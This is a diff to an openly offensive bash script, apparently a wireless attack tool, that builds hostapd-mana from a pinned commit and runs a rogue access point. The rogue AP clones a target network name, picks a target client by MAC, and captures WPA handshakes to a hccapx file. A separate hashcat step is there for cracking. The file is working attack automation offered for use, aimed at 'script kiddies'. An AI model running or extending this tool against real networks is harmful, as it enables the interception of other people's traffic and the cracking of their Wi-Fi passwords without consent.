@@ -29,7 +29,16 @@ cat <<\EOF
 EOF
 
 slow_echo "(c) Copyright by LTFZP (F.R.I.D.A.Y) 2025" 0.1
-
+confirm() {
+    while true; do
+        read -rp "$1 (y/n): " yn
+        case $yn in
+            [Yy]*) return 0 ;;
+            [Nn]*) return 1 ;;
+            *) echo "Please answer with y or n." ;;
+        esac
+    done
+}
 echo -e "\n"
 echo "==========================================="
 slow_echo " 🧠 Welcome, script kiddies!" 0.1
@@ -91,7 +100,6 @@ check_dependencies() {
                 echo "❌ Installation failed. Go fix your internet or sources.list, dummy."
                 exit 1
             fi
-
             echo ""
             echo "✅ All packages installed successfully."
             sleep 1
@@ -99,6 +107,59 @@ check_dependencies() {
         else
             echo "❌ Can't continue without all dependencies. Quitting."
             exit 1
+        fi
+    fi
+    
+echo ""
+    echo "🔍 Checking for hostapd-mana with commit bd6114db..."
+    HOSTAPD_MANA_BIN="/usr/local/bin/hostapd-mana"
+    EXPECTED_COMMIT="bd6114db0e0214003699f446dd7c4cb399efef71"
+
+    need_mana_install=false
+
+    if [ -x "$HOSTAPD_MANA_BIN" ]; then
+        current_commit=$(strings "$HOSTAPD_MANA_BIN" | grep -oE '[a-f0-9]{40}' | head -n1)
+        if [[ "$current_commit" != "$EXPECTED_COMMIT" ]]; then
+            echo -e "⚠️  Found hostapd-mana, but wrong commit ($current_commit)."
+            need_mana_install=true
+        else
+            echo -e "\e[32m✅ hostapd-mana is present and at correct commit.\e[0m"
+        fi
+    else
+        echo -e "\e[31m❌ hostapd-mana not found.\e[0m"
+        need_mana_install=true
+    fi
+
+    if $need_mana_install; then
+        if confirm "Do you want to auto-install hostapd-mana (commit bd6114db)?"; then
+            echo "📥 Cloning and building hostapd-mana..."
+            tmpdir=$(mktemp -d)
+            cd "$tmpdir"
+            git clone https://github.com/sensepost/hostapd-mana.git
+            cd hostapd-mana
+            git checkout "$EXPECTED_COMMIT"
+            cd hostapd
+            make
+
+            if [ -f hostapd ]; then
+                sudo cp hostapd "$HOSTAPD_MANA_BIN"
+                sudo chmod +x "$HOSTAPD_MANA_BIN"
+                echo -e "\e[32m✅ hostapd-mana installed to $HOSTAPD_MANA_BIN\e[0m"
+            else
+                echo -e "\e[31m❌ Build failed. Please check for missing dependencies.\e[0m"
+                exit 1
+            fi
+
+            cd ~
+            rm -rf "$tmpdir"
+        else
+            echo "❌ hostapd-mana installation was skipped."
+            if confirm "Do you want to continue without hostapd-mana?"; then
+                echo "⚠️ Continuing without hostapd-mana. Some features may not work."
+            else
+                echo "❌ Aborting as requested."
+                exit 1
+            fi
         fi
     fi
 }
@@ -174,18 +235,6 @@ install_hashcat() {
         echo "Automated cracking features will be unavailable."
         sleep 2
     fi
-}
-
-
-confirm() {
-    while true; do
-        read -rp "$1 (y/n): " yn
-        case $yn in
-            [Yy]*) return 0 ;;
-            [Nn]*) return 1 ;;
-            *) echo "Please answer with y or n." ;;
-        esac
-    done
 }
 
 check_dependencies
@@ -367,9 +416,6 @@ interface=$TARGET_AP_IFACE
 driver=nl80211
 hw_mode=g
 channel=6
-macaddr_acl=0
-mana_loud=1
-auth_algs=1
 ignore_broadcast_ssid=0
 ssid=$TARGET_ESSID
 wpa=2
@@ -379,6 +425,7 @@ wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
 mana_wpaout=${TARGET_ESSID}-handshake.hccapx
 EOF
+
 
 echo "Configuration successfully created."
 
@@ -428,24 +475,10 @@ TARGET_CLIENT_MAC="${client_list[$client_index]}"
 
 echo "Target client selected: $TARGET_CLIENT_MAC"
 
-# Ensure AP interface is in master mode
-echo "Checking AP interface mode for $TARGET_AP_IFACE..."
-
-sudo ip link set "$TARGET_AP_IFACE" down
-sudo iw dev "$TARGET_AP_IFACE" set type __ap 2>/dev/null
-sudo ip link set "$TARGET_AP_IFACE" up
-
-# Validate mode is master (AP)
-ap_mode_check=$(iwconfig "$TARGET_AP_IFACE" 2>/dev/null | grep -i mode | grep -i master)
-if [[ -z "$ap_mode_check" ]]; then
-    echo "❌ $TARGET_AP_IFACE is not in master (AP) mode."
-    exit 1
-fi
-
 echo "✅ Rogue AP interface is set correctly for hostapd-mana."
 
 echo "Starting hostapd-mana for Rogue AP deployment in a new terminal..."
-launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\" -dd"
+launch_terminal "echo 'Running hostapd-mana...'; sudo hostapd-mana \"$CONFIG_FILE\""
 
 sleep 3
 echo ""
